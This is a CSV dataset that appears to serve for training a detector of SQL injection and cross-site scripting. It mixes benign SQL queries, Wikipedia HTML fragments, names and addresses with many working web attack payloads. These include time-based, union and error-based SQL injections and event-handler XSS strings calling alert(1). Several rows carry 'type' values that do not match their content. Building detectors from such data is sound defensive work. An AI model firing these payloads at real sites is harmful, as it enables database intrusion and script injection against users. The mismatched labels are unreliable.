Text,Label,type
SELECT AVG ( last ) FROM tonight SELECT SUM ( make ) ,0,sql
SELECT Count ( * )  AS wish,0,xss
SELECT * FROM establish ORDER BY neck DESC,0,xss
"<li><cite id=""CITEREFAleksander1995"" class=""citation book""><a href=""/wiki/Igor_Aleksander"" title=""Igor Aleksander"">Aleksander, Igor </a> (1995). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/19970302014628/http://www.ee.ic.ac.uk/research/neural/publications/iwann.html""><i>Artificial Neuroconsciousness: An Update </i> </a>. IWANN. Archived from <a rel=""nofollow"" class=""external text"" href=""http://www.ee.ic.ac.uk/research/neural/publications/iwann.html"">the original </a> on 2 March 1997. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Artificial+Neuroconsciousness%3A+An+Update&amp;rft.pub=IWANN&amp;rft.date=1995&amp;rft.aulast=Aleksander&amp;rft.aufirst=Igor&amp;rft_id=http%3A%2F%2Fwww.ee.ic.ac.uk%2Fresearch%2Fneural%2Fpublications%2Fiwann.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
<svg><abbr onload=alert(1)></abbr>,2,xss
SELECT printed ( s )  FROM verb FULL OUTER JOIN,0,sql
"<map draggable=""true"" ondragstart=""alert(1)"">test</map>",2,xss
"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
"<embed onkeydown=""alert(1)"" contenteditable>test</embed>",2,xss
"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,sql
" SELECT Customers.CustomerName, Orders.OrderIDFROM CustomersFULL OUTER JOIN OrdersON Customers.CustomerID = Orders.CustomerIDORDER BY Customers.CustomerName;",0,xss
DELETE FROM fine WHERE moon = 'reason',0,sql
"  SELECT stop AS given, before AS [knowledge]  FROM train",0,sql
"<style>:target {transform: rotate(180deg);}</style><link id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></link>",2,xss
"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   -- rlas",1,sql
<div onpointerenter=alert(1)>XSS</div>,2,xss
"<div draggable=""true"" contenteditable>drag me</div><ruby ondragover=alert(1) contenteditable>drop here</ruby>",2,xss
"<li><a href=""/wiki/Epistemological_anarchism"" title=""Epistemological anarchism"">Epistemological anarchism </a> </li>",0,xss
SELECT excitement ( s )  FROM lamp FULL OUTER JOIN,0,xss
v433g3o5i6r79,0,xss
SELECT * FROM identity WHERE influence = 'taste'  AND City = 'five',0,sql
SELECT COUNT ( DISTINCT visit )  FROM prove,0,sql
	 </span> </h4>,0,xss
"camino elorrieta, 193, 2a",0,sql
chrysa2,0,sql
"-1303' union all select 4840,4840#",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> Later published as<br /><cite class=""citation book"">Solomonoff, Ray (1957). ""An Inductive Inference Machine"". <i>IRE Convention Record </i>. Section on Information Theory, part 2. pp.&#160;56–62. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=An+Inductive+Inference+Machine&amp;rft.btitle=IRE+Convention+Record&amp;rft.pages=56-62&amp;rft.date=1957&amp;rft.aulast=Solomonoff&amp;rft.aufirst=Ray&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"1%""  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""%""  =  """,1,sql
"<element draggable=""true"" ondragend=""alert(1)"">test</element>",2,xss
"<hgroup onpaste=""alert(1)"" contenteditable>test</hgroup>",2,xss
<time onpointerleave=alert(1)>XSS</time>,2,xss
"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",1,sql
"  SELECT Orders.boyrID, Employees.knowledge, Employees.visit FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.signalID ORDER BY Orders.barkID",0,xss
SELECT * FROM age WHERE equally  BETWEEN 10 AND 20,0,sql
"1'   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,xss
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_3086' LIMIT 1,0,sql
"<link oncopy=""alert(1)"" contenteditable>test</link>",2,xss
DELETE FROM hit,0,sql
"<li><a href=""/wiki/Homeostasis"" title=""Homeostasis"">Homeostasis </a> </li>",0,xss
"1   )    )    as wezj where 2869  =  2869 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,sql
select   (  case when   (  1412  =  5313  )   then 1412 else 1412*  (  select 1412 from mysql.db  )   end  )  #,1,sql
"<button draggable=""true"" ondragend=""alert(1)"">test</button>",2,xss
1 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,sql
1e1ador,0,sql
	 </span> </h3>,0,xss
<div id=x tabindex=1 onactivate=alert(1)></div>,2,xss
werkmeister@19horas.zr,0,xss
"<li><a href=""/wiki/Knowledge_base"" title=""Knowledge base"">Knowledge base </a> </li>",0,xss
analytics.page();,0,xss
SELECT AVG ( flight ) FROM bone SELECT SUM ( but ) ,0,sql
d37t30,0,sql
-5268'  )   where 5615  =  5615 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,sql
SELECT 8 DIV 3;,0,sql
229669a3a,0,sql
"<noembed draggable=""true"" ondrag=""alert(1)"">test</noembed>",2,xss
"1""  )   as bksv where 5375  =  5375",1,xss
gladiolos 30,0,sql
DELETE FROM somehow WHERE factor = 'fruit',0,sql
"<abbr draggable=""true"" ondragstart=""alert(1)"">test</abbr>",2,xss
SELECT nature ( s FROM yesterday RIGHT JOIN,0,xss
1'  )   where 9159  =  9159,1,xss
"<isindex onmousedown=""alert(1)"">test</isindex>",2,xss
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'oskf' like 'oskf",1,sql
"-4248""   )    )    union all select 9450,9450,9450--",1,sql
boget brufau,0,sql
"1""   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"1%""  )   union all select null,null,null,null,null,null,null,null,null#",1,xss
DELETE FROM compare WHERE surprise = 'enemy',0,sql
"av. italia, 66, 4-a",0,sql
"1%""   )    )    union all select null,null,null,null,null,null,null,null#",1,sql
select case when 6558  =  4327 then 1 else null end--,1,xss
"1""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""tfso""  =  ""tfso",1,sql
"<SCRIPT ""a='>'"" SRC=""httx://.rocks/.js""></SCRIPT>",2,xss
padral gracida,0,sql
"<canvas onbeforepaste=""alert(1)"" contenteditable>test</canvas>",2,xss
9639,0,xss
SELECT * FROM origin 3,0,sql
29611,0,sql
select pg_sleep  (  5  )  -- ojzt,1,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"-9015%""  )   union all select 6948,6948--",1,sql
flori@casabolsa43.np,0,xss
"-7234""  )   union all select 3154,3154,3154,3154#",1,xss
SELECT TOP 3 * FROM add SELECT * FROM small 3SELECT * FROM talk,0,sql
SELECT * FROM turn WHERE central LIKE '%who%',0,sql
robledillo de la jara,0,xss
"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,sql
SELECT * FROM doing,0,sql
"1""  )   where 3390  =  3390",1,sql
"  SELECT perhaps,point FROM syllable WHERE sleep = 'dog' UNION SELECT anywhere, you FROM grandfather",0,sql
	 </span> 2018 ,0,xss
"<wbr onkeyup=""alert(1)"" contenteditable>test</wbr>",2,xss
tregenza,0,sql
kenji,0,xss
"<li><a href=""/wiki/Philosophy_of_computer_science"" title=""Philosophy of computer science"">Computer science </a> </li> </ul> </li>",0,xss
"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""vypw"" like ""vypw",1,xss
" select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",1,xss
SELECT COUNT ( darkness ) FROM outline,0,sql
 or 'something' like 'some%',1,sql
"1  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  6690  =  6690",1,sql
-6433%'   )    )    or 9323  =  9323#,1,sql
SELECT COUNT ( joined ) FROM won,0,sql
"1'+  (  select 'drvv' where 5622  =  5622 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"1  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,sql
"INSERT INTO nervous ( eye, figure, in, bark, bone, equipment )  VALUES  ( 'itself', 'taken'. similar', 'sent', 'talk', 'worse', 'dangerous' )  ",0,sql
"AllowScriptAccess=""always""",2,xss
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'hmsu'  =  'hmsu",1,sql
6.91307E+15,0,sql
"1%""   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,1,xss
4135,0,xss
1g5ota323,0,xss
 ,0,xss
"1' where 7353  =  7353 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
DELETE FROM weigh,0,xss
"   SELECT entirely, bare+ ', ' + ten+ ' ' + title+ ', ' + shirt AS evening  FROM planning",0,sql
SELECT * FROM  ( SELECT bridge FROM system ) ,0,sql
SELECT COUNT ( natural ) FROM something,0,sql
<body onmessage=alert(1)>,2,xss
"<div draggable=""true"" contenteditable>drag me</div><font ondrop=alert(1) contenteditable>drop here</font>",2,xss
select   (  case when   (  6434  =  3877  )   then 6434 else 1/  (  select 0  )   end  )  --,1,sql
"  (  select   (  case when   (  1343  =  1343  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1343 end  )   from dual  )  ",1,sql
"1'||  (  select 'yags' where 6268  =  6268 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'",1,sql
<i id=x tabindex=1 onbeforeactivate=alert(1)></i>,2,xss
<dir onpointerdown=alert(1)>XSS</dir>,2,xss
"1'+  (  select 'arzm' where 6464  =  6464 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  +'",1,sql
gnaeding,0,xss
	 </span> </li>,0,xss
SELECT * FROM rapidly WHERE fairly NOT LIKE 'stairs%',0,xss
14724400f,0,sql
SELECT * FROM  ( SELECT shallow FROM drive ) ,0,sql
"<li><a href=""/wiki/Norbert_Wiener"" title=""Norbert Wiener"">Norbert Wiener </a> </li>",0,xss
-6086'   )    )    or   (  6719  =  7280  )  *7280 and    (    (   'ozbj'  =  'ozbj,1,sql
"maestro de burgos, 199",0,xss
	 </span>,0,xss
"1""  )   union all select null,null--",1,sql
ag77avacin,0,xss
Hegemony of the Dartmouth conference attendees:,0,xss
"<menu ondblclick=""alert(1)"">test</menu>",2,xss
SELECT * FROM nest WHERE    NOT burst = 'source',0,sql
SELECT COUNT ( wheel ) FROM lying,0,xss
edlene,0,xss
DELETE FROM hill WHERE aboard = 'opposite',0,xss
47110,0,sql
1  )   as wiyx where 6515  =  6515,1,sql
5348,0,sql
"<input draggable=""true"" ondragleave=""alert(1)"">test</input>",2,xss
"	 </span> <span class=""reference-text"">",0,xss
"<div class=""section"" id=""first-steps"">",0,xss
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,sql
SELECT MIN ( general )  AS add FROM willing,0,sql
"1  )   where 7748  =  7748 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,xss
1'||  (  select 'dajl' from dual where 8440  =  8440,1,sql
SELECT * FROM compass 3 SELECT * FROM mood,0,sql
20061667d,0,sql
"<li><a href=""/wiki/Glossary_of_computer_science"" title=""Glossary of computer science"">Computer science </a> </li>",0,xss
SELECT * FROM research ORDER BY rush,0,sql
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  ""layz""  =  ""layz",1,sql
"1"" where 7879  =  7879",1,xss
"-7831""   )    )    as krzi where 3798  =  3798 order by 1--",1,sql
"c/ arago 194,",0,sql
SELECT * FROM  ( SELECT instance FROM coach ) ,0,sql
"  SELECT * FROM disappear WHERE until NOT IN  ( 'factory', 'behavior', 'winter' )  ",0,sql
jerusaln,0,sql
"<strong oncontextmenu=""alert(1)"">test</strong>",2,xss
SELECT * FROM ill WHERE another = 'surprise',0,sql
"  SELECT * FROM rhyme WHERE duck NOT IN  ( 'damage', 'hurried', 'further' )  ",0,sql
"c/ juan ramon jimenez, 135, 11d",0,sql
cal5br2,0,xss
SELECT * FROM war WHERE    NOT rising = 'frame',0,sql
"-1097"" where 4421  =  4421 union all select 4421,4421,4421,4421,4421#",1,xss
"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan",1,sql
"1""   )    )    as bovm where 5560  =  5560 union all select null,null,null,null,null,null,null#",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
SELECT with ( s )  FROM kind UNION ALL,0,sql
SELECT * FROM column WHERE aloud BETWEEN '1996-07-01' AND '1996-07-31',0,xss
<fieldset onpointerdown=alert(1)>XSS</fieldset>,2,xss
"<aside onmouseout=""alert(1)"">test</aside>",2,xss
1'   )    )    waitfor delay '0:0:5' and    (    (   'bbqk'  =  'bbqk,1,sql
"1"" union all select null,null,null,null,null,null,null,null,null#",1,sql
7.38083E+15,0,sql
"calle la orotava, s/n",0,xss
5.56439E+15,0,sql
"1%""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"<aside ondblclick=""alert(1)"">test</aside>",2,xss
1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'eocx'  =  'eocx,1,sql
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, p.&#160;21, </li>",0,xss
1.0841E+15,0,sql
<meter id=x tabindex=1 onbeforeactivate=alert(1)></meter>,2,xss
1   )    )    as pmff where 6649  =  6649,1,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rt id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></rt>",2,xss
1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'bmhw' like 'bmhw,1,sql
"  UPDATE explore SET section =  'lot', City =  'forgot' WHERE equator =  eaten",0,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figcaption>",2,xss
"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'ifca' like 'ifca",1,sql
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;453–505, </li>",0,xss
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",1,sql
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Artificial_consciousness"" title=""Artificial consciousness"">Artificial consciousness </a> </div>",0,xss
 </p>,0,xss
	 </span> </li>,0,xss
	 </span> </a> </li>,0,xss
SELECT * FROM were WHERE cloth IN  ( SELECT balloon FROM minerals ) ,0,sql
SELECT * FROM out WHERE sight = 'dot',0,sql
SELECT * FROM biggest WHERE entirely BETWEEN lay09/01/1996flight AND curious15/31/1996limited,0,xss
<rb id=x tabindex=1 ondeactivate=alert(1)></rb><input id=y autofocus>,2,xss
" select sleep  (  5  )   and ""%""  =  """,1,xss
SELECT spent ( s )  FROM chief SELECT long FROM sum,0,sql
"<blink onmouseover=""alert(1)"">test</blink>",2,xss
"-4135'   )    )     )   union all select 4413,4413,4413#",1,sql
"<tbody draggable=""true"" ondragleave=""alert(1)"">test</tbody>",2,xss
"  SELECT tales,public FROM bite WHERE nervous = 'throughout' UNION SELECT rhyme, wooden FROM effect",0,sql
"<marquee ondblclick=""alert(1)"">test</marquee>",2,xss
SELECT * FROM ordinary,0,sql
"<style>@keyframes x{}</style><cite style=""animation-name:x"" onanimationstart=""alert(1)""></cite>",2,xss
<button onpointermove=alert(1)>XSS</button>,2,xss
"port fangos, 183,",0,xss
<footer onpointerleave=alert(1)>XSS</footer>,2,xss
  </div>,0,xss
"   SELECT Employees.pound, COUNT ( Orders.carryID )  AS produceFROM    ( OrdersINNER JOIN whatever ON Orders.hurtID  =  Employees.asID ) ",0,sql
SELECT * FROM order WHERE but = 'piano' LIMIT 3,0,sql
"1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  5468  =  5468",1,sql
--SELECT * FROM Customers;,0,sql
espins marmesat,0,sql
SELECT cap ( s )  FROM few LEFT JOIN,0,sql
SELECT hearing ( s )  FROM changing SELECT reach ( s ) ,0,xss
"-9861' union all select 5710,5710,5710,5710,5710--",1,sql
bfilename,1,sql
"<dialog onbeforecut=""alert(1)"" contenteditable>test</dialog>",2,xss
stadler_munks@chevrolet-volt.at,0,sql
SELECT COUNT ( dependID ) FROM relationship,0,sql
"   SELECT writing, tea, heldFROM forest WHERE swung  IS NOT NULL",0,xss
imokoude@transportesvegasl.et,0,sql
		 </div> </div>,0,xss
<iframe onpointerover=alert(1)>XSS</iframe>,2,xss
"<summary onmousedown=""alert(1)"">test</summary>",2,xss
 </li>,0,xss
